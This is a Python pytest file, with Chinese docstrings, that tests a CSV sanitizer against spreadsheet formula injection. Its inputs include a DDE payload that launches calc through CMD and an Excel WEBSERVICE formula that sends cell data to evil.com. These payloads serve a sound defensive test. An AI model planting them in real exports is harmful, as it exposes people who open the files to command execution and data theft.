"""CSV 工具函数测试"""
import pytest
from app.utils.csv_utils import sanitize_csv_cell


@pytest.mark.unit
class TestCsvUtils:
    """CSV 注入防护测试"""

    def test_sanitize_formula_equals(self):
        """测试 = 开头的公式注入"""
        result = sanitize_csv_cell("=SUM(A1:A10)")
        assert result == "'=SUM(A1:A10)"

    def test_sanitize_formula_plus(self):
        """测试 + 开头的公式注入"""
        result = sanitize_csv_cell("+CMD|'/C calc'!A0")
        assert result == "'+CMD|'/C calc'!A0"

    def test_sanitize_formula_minus(self):
        """测试 - 开头的公式注入"""
        result = sanitize_csv_cell("-10+5")
        assert result == "'-10+5"

    def test_sanitize_formula_at(self):
        """测试 @ 开头的公式注入"""
        result = sanitize_csv_cell("@SUM(A1:A10)")
        assert result == "'@SUM(A1:A10)"

    def test_sanitize_formula_tab(self):
        """测试 Tab 开头"""
        result = sanitize_csv_cell("\t=CMD")
        assert result == "'\t=CMD"

    def test_sanitize_formula_carriage_return(self):
        """测试回车开头"""
        result = sanitize_csv_cell("\r=CMD")
        assert result == "'\r=CMD"

    def test_sanitize_normal_text(self):
        """测试正常文本不被修改"""
        result = sanitize_csv_cell("Hello World")
        assert result == "Hello World"

    def test_sanitize_empty_string(self):
        """测试空字符串"""
        result = sanitize_csv_cell("")
        assert result == ""

    def test_sanitize_none_value(self):
        """测试 None 值"""
        result = sanitize_csv_cell(None)
        assert result is None

    def test_sanitize_numeric_string(self):
        """测试数字字符串不被修改"""
        result = sanitize_csv_cell("123.45")
        assert result == "123.45"

    def test_sanitize_webservice_injection(self):
        """测试 Excel WEBSERVICE 注入"""
        result = sanitize_csv_cell('=WEBSERVICE("https://evil.com/?data="&A1)')
        assert result.startswith("'")
        assert "=WEBSERVICE" in result
